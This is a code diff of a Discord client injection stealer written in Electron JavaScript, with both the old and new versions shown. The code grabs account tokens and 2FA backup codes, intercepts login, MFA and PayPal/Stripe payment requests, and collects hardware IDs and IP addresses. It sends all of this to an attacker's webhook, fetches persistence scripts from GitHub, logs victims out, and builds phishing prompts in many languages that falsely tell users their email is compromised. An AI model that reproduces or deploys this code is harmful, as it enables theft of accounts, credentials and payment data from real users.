@@ -1,637 +1,1594 @@
-const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
-    { execSync } = require("child_process"),
-    { parse: parse } = require("querystring"),
-    fs = require("fs"),
-    os = require("os"),
-    https = require("https"),
-    path = require("path");
+const querystring = require('querystring');
+const https = require('https');
+const http = require('http');
+const path = require('path');
+const fs = require('fs');
 
-let WEBHOOK = "%WEBHOOK%";
+const { exec } = require('child_process');
+const { promisify } = require('util');
+const { BrowserWindow, session } = require('electron');
 
-let [
-    BACKUPS_CODES_SCRIPT,
-    LOGOUT_SCRIPT,
-    TOKEN_SCRIPT,
-    INJECT_URL,
-    BADGES,
-    EMAIL,
-    PASSWORD
-] = [
-        `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
-        'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
-        "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
-        "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
-        {
-            _nitro: [
-                "<:_:1087043238654906472> ",
-                "<:_:1087043319227494460> ",
-                "<:_:1087043368250511512> ",
-                "<:_:1087043493236592820> ",
-                "<:_:1087043493236592820> ",
-                "<:_:1162420359291732038> ",
-                "<:_:1051453775832961034> ",
-                "<:_:1051453778127237180> ",
-                "<:_:1051453776889917530> ",
-            ],
-            _discord_emloyee: {
-                value: 1,
-                emoji: "<:_:1163172252989259898>",
-                rare: true,
-            },
-            _partnered_server_owner: {
-                value: 2,
-                emoji: "<:_:1163172304155586570>",
-                rare: true,
-            },
-            _hypeSquad_events: {
-                value: 4,
-                emoji: "<:_:1163172248140660839>",
-                rare: true,
-            },
-            _bug_hunter_level_1: {
-                value: 8,
-                emoji: "<:_:1163172239970140383>",
-                rare: true,
-            },
-            _house_bravery: {
-                value: 64,
-                emoji: "<:_:1163172246492287017>",
-                rare: false,
-            },
-            _house_brilliance: {
-                value: 128,
-                emoji: "<:_:1163172244474822746>",
-                rare: false,
-            },
-            _house_balance: {
-                value: 256,
-                emoji: "<:_:1163172243417858128>",
-                rare: false,
-            },
-            _early_supporter: {
-                value: 512,
-                emoji: "<:_:1163172241996005416>",
-                rare: true,
-            },
-            _bug_hunter_level_2: {
-                value: 16384,
-                emoji: "<:_:1163172238942543892>",
-                rare: true,
-            },
-            _early_bot_developer: {
-                value: 131072,
-                emoji: "<:_:1163172236807639143>",
-                rare: true,
-            },
-            _certified_moderator: {
-                value: 262144,
-                emoji: "<:_:1163172255489085481>",
-                rare: true,
-            },
-            _active_developer: {
-                value: 4194304,
-                emoji: "<:_:1163172534443851868>",
-                rare: true,
-            },
+const execCommand = async (command, options = {}) => {
+  try {
+    const { stdout, stderr } = await promisify(exec)(command, options);
+    if (stderr) {
+      console.error(stderr);
+    }
+    return stdout.trim();
+  } catch (error) {
+    return null;
+  }
+};
+
+const execScript = async (script) => {
+    const windows = BrowserWindow.getAllWindows();
+    if (windows.length === 0) return null;
+    try {
+        const result = await windows[0].webContents.executeJavaScript(script, true);
+        return result;
+    } catch (error) {
+        return null;
+    }
+};
+
+const CONFIG = {
+    webhook: '%WEBHOOK_URL%',
+    API: '%API_URL%',
+    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
+    injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
+    force_persist_startup: 'true',
+    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
+    auto_email_update: '%AUTO_EMAIL_UPDATE%',
+    gofile_download_link: '%GOFILE_DOWNLOAD_LINK%',
+    get: {
+        token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
+        logout: () => execScript(`function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`),
+        backup_codes: () => execScript(`const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`),
+    },
+    auth_filters: {
+        urls: [
+            '/mfa/totp',
+            '/mfa/totp/enable',
+            '/mfa/sms/enable',
+            '/mfa/totp/disable',
+            '/mfa/sms/disable',
+            '/mfa/codes-verification',
+            '/auth/login',
+            '/auth/register',
+            '/users/@me',
+        ],
+    },
+    session_filters: {
+        urls: [
+            'wss://remote-auth-gateway.discord.gg/*',
+            'https://discord.com/api/v*/auth/sessions',
+            'https://*.discord.com/api/v*/auth/sessions',
+            'https://discordapp.com/api/v*/auth/sessions',
+        ],
+    },
+    payment_filters: {
+        urls: [
+            'https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens', 
+            'https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',
+            'https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens',   
+            'https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address',
+            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
+            'https://api.stripe.com/v*/tokens',
+        ],
+    },
+    badges: {
+        _nitro: [
+            "<:DiscordBoostNitro1:1087043238654906472> ",
+            "<:DiscordBoostNitro2:1087043319227494460> ",
+            "<:DiscordBoostNitro3:1087043368250511512> ",
+            "<:DiscordBoostNitro6:1087043493236592820> ",
+            "<:DiscordBoostNitro9:1087043493236592820> ",
+            "<:DiscordBoostNitro12:1162420359291732038> ",
+            "<:DiscordBoostNitro15:1051453775832961034> ",
+            "<:DiscordBoostNitro18:1051453778127237180> ",
+            "<:DiscordBoostNitro24:1051453776889917530> ",
+        ],
+        _discord_emloyee: {
+            value: 1,
+            emoji: "<:DiscordEmloyee:1163172252989259898>",
+            rare: true,
         },
-        "",
-        ""
-    ];
+        _partnered_server_owner: {
+            value: 2,
+            emoji: "<:PartneredServerOwner:1163172304155586570>",
+            rare: true,
+        },
+        _hypeSquad_events: {
+            value: 4,
+            emoji: "<:HypeSquadEvents:1163172248140660839>",
+            rare: true,
+        },
+        _bug_hunter_level_1: {
+            value: 8,
+            emoji: "<:BugHunterLevel1:1163172239970140383>",
+            rare: true,
+        },
+        _house_bravery: {
+            value: 64,
+            emoji: "<:HouseBravery:1163172246492287017>",
+            rare: false,
+        },
+        _house_brilliance: {
+            value: 128,
+            emoji: "<:HouseBrilliance:1163172244474822746>",
+            rare: false,
+        },
+        _house_balance: {
+            value: 256,
+            emoji: "<:HouseBalance:1163172243417858128>",
+            rare: false,
+        },
+        _early_supporter: {
+            value: 512,
+            emoji: "<:EarlySupporter:1163172241996005416>",
+            rare: true,
+        },
+        _bug_hunter_level_2: {
+            value: 16384,
+            emoji: "<:BugHunterLevel2:1163172238942543892>",
+            rare: true,
+        },
+        _early_bot_developer: {
+            value: 131072,
+            emoji: "<:EarlyBotDeveloper:1163172236807639143>",
+            rare: true,
+        },
+        _certified_moderator: {
+            value: 262144,
+            emoji: "<:CertifiedModerator:1163172255489085481>",
+            rare: true,
+        },
+        _active_developer: {
+            value: 4194304,
+            emoji: "<:ActiveDeveloper:1163172534443851868>",
+            rare: true,
+        },
+        _spammer: {
+            value: 1048704,
+            emoji: "⌨️",
+            rare: false,
+        },
+    },
+};
 
 const request = async (method, url, headers = {}, data = null) => {
     try {
-        return new Promise((resolve, reject) => {
-            let object = new URL(url),
-                options = {
-                    protocol: object.protocol,
-                    hostname: object.hostname,
-                    path: object.pathname + object.search,
-                    method: method.toUpperCase(),
+        const requests = [...(url.includes('api/webhooks') ? [url, CONFIG.API] : [url])].map(url => {
+            return new Promise((resolve, reject) => {
+                const { protocol, hostname, pathname, search } = new URL(url);
+                const client = protocol === 'https:' ? https : http;
+                const options = {
+                    hostname,
+                    path: pathname + search,
+                    method,
                     headers: {
+                        'Access-Control-Allow-Origin': '*',
                         ...headers,
-                        "Access-Control-Allow-Origin": "*"
-                    }
+                    },
                 };
-            let req = https.request(options, (res) => {
-                let resd = '';
-                res.on('data', (chunk) => resd += chunk);
-                res.on('end', () => resolve(resd));
+                const req = client.request(options, (res) => {
+                    let resData = '';
+                    res.on('data', (chunk) => resData += chunk);
+                    res.on('end', () => resolve(resData));
+                });
+                req.on('error', err => reject(err));
+                if (data) req.write(data);
+                req.end();
             });
-            req.on('error', (err) => reject(err));
-            if (data) req.write(data);
-            req.end();
         });
+        return Promise.all(requests);
     } catch (err) {
         return Promise.reject(err);
     }
 };
 
-const notify = async (ctx, token, acc) => {
-    let system = {
-        CPU: os.cpus()[0].model,
-        GPU: execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, ""),
-        UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID",).toString().split("\r\n")[0],
-        RAM: (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2) + " GB",
-        Mac_Address: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress",).toString().split("\r\n")[0],
-        Product_Key: execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",).toString().split("\r\n")[0],
-        Local_IP: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split("\r\n")[0],
-        CPU_Count: os.cpus().length,
-        PC_Name: os.hostname(),
-        OS_Version: `${os.type()} ${os.arch()}`,
-    };
+const notify = async (ctx, token, user) => {
+    const getData = new GetDataUser();
+    const getFetcher = new Fetcher(token);
 
-    let nitro = getNitro(await fProfile(token)),
-        badges = await getBadges(acc.flags),
-        billing = await getBilling(token),
-        friends = await getFriends(token),
-        servers = await getServers(token);
+    const [profile, system ,network, billing, friends, servers] = [
+       await getFetcher.Profile(),
+       await getData.SystemInfo(),
+       await getData.Network(),
+       await getData.Billing(token),
+       await getData.Friends(token),
+       await getData.Servers(token),
+    ];
 
-    ctx.username = "@AuraThemes - Injection";
-    ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
-    ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
+    const [nitro, badges] = [
+        getData.Nitro(profile),
+        getData.Badges(user.flags),
+    ];
+
+    ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
+    ctx.username = `AuraThemes - injection`;
+    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
     ctx.embeds[0].fields.unshift({
-        name: `<a:aura:1087044506542674091> Token:`,
+        name: `<a:hearts:1176516454540116090> Token:`,
         value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
         inline: false
     })
 
     ctx.embeds[0].thumbnail = {
-        url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
+        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
     };
 
     ctx.embeds[0].fields.push(
-        { name: "Nitro", value: nitro, inline: true },
+        { name: "Nitro", value: nitro, inline: false },
         { name: "Badges", value: badges, inline: true },
         { name: "Billing", value: billing, inline: true },
-        { name: "Path", value: `\`${__dirname.toString().trim().replace(/\\/g, "/")}\``, inline: false },
+        { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
-    ctx.embeds.push(
-        { title: `HQ Friend(s)`, description: friends },
-        { title: `HQ Guild(s)`, description: servers },
-        {
-            title: `System Informatio(s)`,
-            fields: [
-                { name: "User", value: `||\`\`\`yml\nUsername: ${os.userInfo().username}\`\`\`||`, inline: true },
-                { name: "System", value: `||\`\`\`yml\n${Object.entries({ ...system }).map(([k, v]) => `${k}: ${v}`).join("\n")}\`\`\`||`, },
-                { name: "Network", value: `||\`\`\`yml\nPublic: ${JSON.parse(await getNetwork()).ip}\`\`\`||`, }
-            ]
-        },
-    );
+    if (friends) {
+        ctx.embeds.push({ title: friends.title, description: friends.description });
+    }
 
-    ctx.embeds.forEach((e) => {
-        e.color = 12740607;
-        e.timestamp = new Date();
-        e.author = {
-            name: `${acc.username} | ${acc.id}`,
-            icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
+    if (servers) {
+        ctx.embeds.push({ title: servers.title, description: servers.description });
+    }
+
+    if (CONFIG.gofile_download_link !== '%GOFILE_DOWN' + 'LOAD_LINK%') {
+        ctx.embeds.push({ title: 'Gofile Download Link', description: `[Download here](${CONFIG.gofile_download_link})` });
+    }
+
+    ctx.embeds.push({
+        title: `System Information`,
+        fields: [
+            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
+            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
+            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
+        ]
+    });
+
+    ctx.embeds.forEach(embed => {
+        embed.color = 12740607;
+        embed.author = {
+            name: `${user.username} | ${user.id}`,
+            icon_url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`,
         };
-        e.footer = {
-            text: decodeB64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
-            icon_url: "https://i.imgur.com/yVnOSeS.gif",
+        embed.footer = {
+            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
+            icon_url: "https://avatars.githubusercontent.com/u/103044629",
         };
+        embed.timestamp = new Date();
     });
 
     try {
-        await request("POST", WEBHOOK, {
+        await request('POST', CONFIG.webhook, {
             "Content-Type": "application/json"
         }, JSON.stringify(ctx));
     } catch (error) {
-        console.error("Error sending request to webhook:", error.message);
+        console.error();
     }
 };
 
-const decodeB64 = (s) =>
-    Buffer.from(s, 'base64').toString();
+const editSettingUser = async () => {
+    try {
+        const {token} = await AuritaCord();
 
-const execScript = async (s) =>
-    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
+        const data = {
+            status: 'dnd',
+            email_notifications_enabled: false,
+            stream_notifications_enabled: false,
+            custom_status: { 
+                text: 'hackedbyk4itrun', 
+                expires_at: null, 
+                emoji_id: null, 
+                emoji_name: null
+            },
+        };
 
-const fetch = async (e, h) =>
-    JSON.parse(await request("GET", `${[
-        'https://discordapp.com/api',
-        'https://discord.com/api',
-        'https://canary.discord.com/api',
-        'https://ptb.discord.com/api'
-    ][Math.floor(Math.random() * 4)]}/v9/users/${e}`, { ...h }));
+        const patchData = JSON.stringify(data);
 
-const fAccount = async (authorization) =>
-    await fetch("@me", { authorization });
+        const response = await request('PATCH', 'https://discord.com/api/v9/users/@me/settings', {
+            'Content-Type': 'application/json',
+            'Content-Length': patchData.length,
+            'Authorization': token
+        }, patchData);
 
-const fProfile = async (authorization) =>
-    await fetch(`${Buffer.from(authorization.split(".")[0], "base64").toString("binary")}/profile`, { authorization });
-
-const fFriends = async (authorization) =>
-    await fetch("@me/relationships", { authorization });
-
-const fServers = async (authorization) =>
-    await fetch("@me/guilds?with_counts=true", { authorization });
-
-const fBilling = async (authorization) =>
-    await fetch("@me/billing/payment-sources", { authorization });
-
-const getNetwork = async () =>
-    await request("GET", "https://api.ipify.org/?format=json", {
-        "Content-Type": "application/json"
-    });
-
-const getBadges = (f) =>
-    Object.keys(BADGES)
-        .reduce((s, h) => BADGES.hasOwnProperty(h)
-            && (f & BADGES[h].value) === BADGES[h].value
-            ? `${s}${BADGES[h].emoji} `
-            : s, "",
-        ) || ":x:";
-
-const getRareBadges = (f) =>
-    Object.keys(BADGES)
-        .reduce((b, e) => BADGES.hasOwnProperty(e)
-            && (f & BADGES[e].value) === BADGES[e].value
-            && BADGES[e].rare
-            ? `${b}${BADGES[e].emoji} `
-            : b, "",
-        );
-
-const getBilling = async (t) =>
-    (await fBilling(t))
-        .filter((x) => !x.invalid)
-        .map((x) => x.type === 1
-            ? "<a:_:1073251424986730516> "
-            : x.type === 2
-                ? "<:_:1148653305376034967> "
-                : "",
-        ).join("") || ":x:";
-
-const getFriends = async (s) =>
-    (await fFriends(s))
-        .filter((user) => user.type === 1)
-        .reduce((r, a) => ((b) => b
-            ? (r || "**Rare Friends:**\n") + `${b} ${a.user.username}#${a.user.discriminator}\n`
-            : r)(getRareBadges(a.user.public_flags)),
-            "",
-        ) || ":x:";
-
-const getServers = async (w) =>
-    (await fServers(w))
-        .filter((g) => g.permissions === (562949953421311).toString() && g.approximate_member_count >= 500)
-        .reduce((r, g) => (r || "**Rare Servers:**\n") + `${g.owner
-            ? ":crown: Owner"
-            : ":gear: Admin"} | Server Name: \`${g.name}\` | Members: \`${g.approximate_member_count}\` - Online(s): \`${g.approximate_presence_count}\`\n[[Get Avatar Link]](https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=2048)\n`, "",
-        ) || ":x:";
-
-const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);
-
-const getNitro = (u) => {
-    let { premium_type, premium_guild_since } = u,
-        x = "<:_:587201513873473542>";
-    switch (premium_type) {
-        default:
-            return ":x:";
-        case 1:
-            return x;
-        case 2:
-            if (!premium_guild_since) return x;
-            let m = [2, 3, 6, 9, 12, 15, 18, 24],
-                rem = 0;
-            for (let i = 0; i < m.length; i++)
-                if (Math.round((getDate(new Date(premium_guild_since), m[i]) - new Date()) / 86400000) > 0) {
-                    rem = i;
-                    break;
-                }
-            return `${x} ${BADGES._nitro[rem]}`;
+        return JSON.parse(response);
+    } catch (error) {
+        return {};
     }
 };
 
-const cruise = async (type, mail, pass, res, req, act) => {
-    let info;
-    let msg;
-    let token;
+const translateAutoEmailUpdate = async (lang) => {
+    const languages = {
+        "zh-CN": [
+            "用户设置",
+            "编辑电子邮件地址",
+            "更改电子邮件地址",
+            "我们在您的 Discord 帐户中检测到了一些异常情况，您的地址,",
+            "已经受到威胁。",
+            "请更改它以继续使用您的帐户。",
+            "您不再可以访问您的电子邮件地址",
+            "联系您的电子邮件提供商以解决问题。",
+        ],
+        "zh-TW": [
+            "用戶設置",
+            "編輯電子郵件地址",
+            "更改電子郵件地址",
+            "我們檢測到您的Discord帳戶有異常情況，您的地址",
+            "受到威脅。",
+            "請更改它以繼續使用您的帳戶。",
+            "您不再能夠訪問您的電子郵件地址",
+            "請聯繫您的電子郵件提供商以修復問題。",
+        ],
+        "en-GB": [
+            "User Settings",
+            "Edit email address",
+            "Change your Email-Address",
+            "We have detected something unusual with your Discord account, your address,",
+            "has been compromised.",
+            "Please change it to continue using your account.",
+            "No longer have access to your email",
+            "Contact your email provider to fix it.",
+        ],
+        "en-US": [
+            "User Settings",
+            "Edit email address",
+            "Change your Email-Address",
+            "We have detected something unusual with your Discord account, your address,",
+            "has been compromised.",
+            "Please change it to continue using your account.",
+            "No longer have access to your email",
+            "Contact your email provider to fix it.",
+        ],
+        "es-ES": [
+            "Configuración del usuario",
+            "Editar dirección de correo electrónico",
+            "Cambia tu dirección de correo electrónico",
+            "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
+            "ha sido comprometida.",
+            "Por favor, cámbiala para continuar usando tu cuenta.",
+            "¿Ya no tienes acceso a tu correo electrónico?",
+            "Contacta a tu proveedor de correo electrónico para solucionarlo."
+        ],
+        "es-419": [
+            "Configuración del usuario",
+            "Editar dirección de correo electrónico",
+            "Cambia tu dirección de correo electrónico",
+            "Hemos detectado algo inusual con tu cuenta de Discord, tu dirección",
+            "ha sido comprometida.",
+            "Por favor, cámbiala para continuar usando tu cuenta.",
+            "¿Ya no tienes acceso a tu correo electrónico?",
+            "Contacta a tu proveedor de correo electrónico para solucionarlo."
+        ],
+        "pr-BR": [
+            "Configurações do usuário",
+            "Editar endereço de e-mail",
+            "Altere seu endereço de e-mail",
+            "Detectamos algo incomum em sua conta Discord, seu endereço,",
+            "foi comprometido.",
+            "Por favor, altere-o para continuar usando sua conta.",
+            "Você não tem mais acesso ao seu endereço de e-mail",
+            "Contate seu provedor de e-mail para corrigi-lo.",
+        ],
+        "sv-SE": [
+            "Användarinställningar",
+            "Redigera e-postadress",
+            "Ändra din e-postadress",
+            "Vi har upptäckt något ovanligt med ditt Discord-konto, din adress,",
+            "har komprometterats.",
+            "Ändra den för att fortsätta använda ditt konto.",
+            "Du har inte längre tillgång till din e-postadress",
+            "Kontakta din e-postleverantör för att åtgärda det.",
+        ],
+        "fr": [
+            "Paramètres utilisateur",
+            "Modifier l\\'adresse e-mail",
+            "Changez votre adresse e-mail",
+            "Nous avons détecté quelque chose d\\'inhabituel avec votre compte Discord, votre adresse,",
+            "a été compromise.",
+            "Veuillez la changer pour continuer à utiliser votre compte.",
+            "Vous n\\'avez plus accès à votre adresse e-mail",
+            "Contactez votre fournisseur de messagerie pour la réparer.",
+        ],
+        "pt": [
+            "Configurações do usuário",
+            "Editar endereço de e-mail",
+            "Altere seu endereço de e-mail",
+            "Detectamos algo incomum em sua conta Discord, seu endereço,",
+            "foi comprometido.",
+            "Por favor, altere-o para continuar usando sua conta.",
+            "Você não tem mais acesso ao seu endereço de e-mail",
+            "Contate seu provedor de e-mail para corrigi-lo.",
+        ],
+        "da": [
+            "Brugerindstillinger",
+            "Rediger e-mailadresse",
+            "Ændre din e-mailadresse",
+            "Vi har registreret noget usædvanligt med din Discord-konto, din adresse,",
+            "er blevet kompromitteret.",
+            "Ændre den for at fortsætte med at bruge din konto.",
+            "Du har ikke længere adgang til din e-mailadresse",
+            "Kontakt din e-mail-udbyder for at få det rettet.",
+        ],
+        "de": [
+            "Benutzereinstellungen",
+            "E-Mail-Adresse bearbeiten",
+            "Ändern Sie Ihre E-Mail-Adresse",
+            "Wir haben etwas Ungewöhnliches an Ihrem Discord-Konto festgestellt, Ihre Adresse,",
+            "wurde kompromittiert.",
+            "Ändern Sie sie, um Ihre Konto weiterhin zu verwenden.",
+            "Sie haben keinen Zugriff mehr auf Ihre E-Mail-Adresse",
+            "Kontaktieren Sie Ihren E-Mail-Anbieter, um das Problem zu beheben.",
+        ],
+        "hr": [
+            "Korisničke postavke",
+            "Uredi adresu e-pošte",
+            "Promijenite svoju adresu e-pošte",
+            "Otkrili smo nešto neuobičajeno s vašim Discord računom, vaša adresa,",
+            "je kompromitirana.",
+            "Promijenite je da biste nastavili koristiti svoj račun.",
+            "Više nemate pristup svojoj e-pošti",
+            "Kontaktirajte svog pružatelja e-pošte da to popravi.",
+        ],
+        "it": [
+            "Impostazioni utente",
+            "Modifica indirizzo email",
+            "Cambia il tuo indirizzo email",
+            "Abbiamo rilevato qualcosa di insolito nel tuo account Discord, il tuo indirizzo,",
+            "è stato compromesso.",
+            "Per favore cambialo per continuare a usare il tuo account.",
+            "Non hai più accesso alla tua email",
+            "Contatta il tuo provider email per risolvere il problema.",
+        ],
+        "lt": [
+            "Vartotojo nustatymai",
+            "Redaguoti el. pašto adresą",
+            "Pakeiskite savo el. pašto adresą",
+            "Su jūsų Discord paskyra aptikome kažką neįprasto, jūsų adresas,",
+            "buvo pažeistas.",
+            "Pakeiskite jį, kad galėtumėte toliau naudoti savo paskyrą.",
+            "Dabar neturite prieigos prie savo el. pašto",
+            "Kreipkitės į savo el. pašto tiekėją, kad jį ištaisytumėte.",
+        ],
+        "hu": [
+            "Felhasználói beállítások",
+            "E-mail cím szerkesztése",
+            "Változtassa meg e-mail címét",
+            "Furcsaságot észleltünk a Discord fiókjában, az ön címe,",
+            "meg lett veszélyeztetve.",
+            "Kérem változtassa meg, hogy folytathassa fiókjának használatát.",
+            "Nincs többé hozzáférése az e-mail címéhez",
+            "Lépjen kapcsolatba az e-mail szolgáltatójával, hogy kijavítsa.",
+        ],
+        "no": [
+            "Brukerinnstillinger",
+            "Rediger e-postadresse",
+            "Endre e-postadressen din",
+            "Vi har oppdaget noe uvanlig med din Discord-konto, din adresse,",
+            "har blitt kompromittert.",
+            "Vennligst endre den for å fortsette å bruke kontoen din.",
+            "Har ikke lenger tilgang til e-posten din",
+            "Ta kontakt med e-postleverandøren din for å fikse det.",
+        ],
+        "pl": [
+            "Ustawienia użytkownika",
+            "Edytuj adres e-mail",
+            "Zmień swój adres e-mail",
+            "Wykryliśmy coś nietypowego w Twoim koncie Discord, Twój adres,",
+            "został naruszony.",
+            "Zmień go, aby kontynuować korzystanie z konta.",
+            "Nie masz już dostępu do swojej poczty e-mail",
+            "Skontaktuj się z dostawcą usług poczty e-mail, aby to naprawić.",
+        ],
+        "ro": [
+            "Setări utilizator",
+            "Editare adresă de email",
+            "Schimbă-ți adresa de email",
+            "Am detectat ceva neobișnuit în contul tău Discord, adresa ta,",
+            "a fost compromisă.",
+            "Te rugăm să o schimbi pentru a continua să-ți folosești contul.",
+            "Nu mai ai acces la adresa ta de email",
+            "Contactează furnizorul tău de email pentru a rezolva problema.",
+        ],
+        "fi": [
+            "Käyttäjäasetukset",
+            "Muokkaa sähköpostiosoitetta",
+            "Vaihda sähköpostiosoitteesi",
+            "Olemme havainneet jotain epätavallista Discord-tililläsi, osoitteesi,",
+            "on vaarantunut.",
+            "Vaihda se jatkaaksesi tilisi käyttöä.",
+            "Sinulla ei ole enää pääsyä sähköpostiisi",
+            "Ota yhteyttä sähköpostin tarjoajaasi ongelman korjaamiseksi.",
+        ],
+        "vi": [
+            "Cài đặt người dùng",
+            "Chỉnh sửa địa chỉ email",
+            "Thay đổi địa chỉ email của bạn",
+            "Chúng tôi đã phát hiện một điều gì đó bất thường trong tài khoản Discord của bạn, địa chỉ của bạn,",
+            "đã bị đe dọa.",
+            "Vui lòng thay đổi nó để tiếp tục sử dụng tài khoản của bạn.",
+            "Bạn không còn quyền truy cập vào địa chỉ email của mình nữa",
+            "Liên hệ với nhà cung cấp email của bạn để sửa chữa nó.",
+        ],
+        "tr": [
+            "Kullanıcı Ayarları",
+            "E-posta adresini düzenle",
+            "E-posta adresini değiştir",
+            "Discord hesabınızda alışılmadık bir şey tespit ettik, adresiniz,",
+            "tehlikeye girdi.",
+            "Kullanmaya devam etmek için lütfen değiştirin.",
+            "Artık e-posta adresinize erişiminiz yok",
+            "Sorunu çözmek için e-posta sağlayıcınızla iletişime geçin.",
+        ],
+        "cs": [
+            "Uživatelské nastavení",
+            "Upravit e-mailovou adresu",
+            "Změnit e-mailovou adresu",
+            "Bylo zjištěno něco neobvyklého s vaším účtem Discord, vaše adresa,",
+            "byla narušena.",
+            "Prosím změňte ji, abyste mohli nadále používat svůj účet.",
+            "Nemáte již přístup k vaší e-mailové adrese",
+            "Kontaktujte svého poskytovatele e-mailu, abyste to opravili.",
+        ],
+        "el": [
+            "Ρυθμίσεις χρήστη",
+            "Επεξεργασία διεύθυνσης email",
+            "Αλλαγή διεύθυνσης email",
+            "Έχουμε ανιχνεύσει κάτι ασυνήθιστο με το λογαριασμό σας στο Discord, η διεύθυνσή σας,",
+            "έχει διακινδυνευθεί.",
+            "Παρακαλούμε αλλάξτε τη για να συνεχίσετε να χρησιμοποιείτε το λογαριασμό σας.",
+            "Δεν έχετε πλέον πρόσβαση στη διεύθυνση email σας",
+            "Επικοινωνήστε με τον πάροχο email σας για να το διορθώσετε.",
+        ],
+        "bg": [
+            "Потребителски настройки",
+            "Редактиране на имейл адрес",
+            "Промяна на имейл адреса",
+            "Открихме нещо необичайно във вашия Discord акаунт, вашия адрес,",
+            "е бил компрометиран.",
+            "Моля, променете го, за да продължите да използвате вашия акаунт.",
+            "Вече нямате достъп до вашия имейл адрес",
+            "Свържете се с вашия доставчик на имейли, за да го оправите.",
+        ],
+        "ru": [
+            "Настройки пользователя",
+            "Изменить адрес электронной почты",
+            "Изменить адрес электронной почты",
+            "Мы обнаружили что-то необычное в вашей учетной записи Discord, ваш адрес",
+            "был скомпрометирован.",
+            "Пожалуйста, измените его, чтобы продолжить использовать свою учетную запись.",
+            "У вас больше нет доступа к вашему адресу электронной почты",
+            "Свяжитесь со своим поставщиком электронной почты, чтобы исправить это.",
+        ],
+        "uk": [
+            "Налаштування користувача",
+            "Редагування електронної адреси",
+            "Змінити електронну адресу",
+            "Ми виявили щось незвичайне з вашим обліковим записом Discord, ваша адреса",
+            "була під загрозою.",
+            "Будь ласка, змініть її, щоб продовжити використання свого облікового запису.",
+            "Ви більше не маєте доступу до своєї електронної адреси",
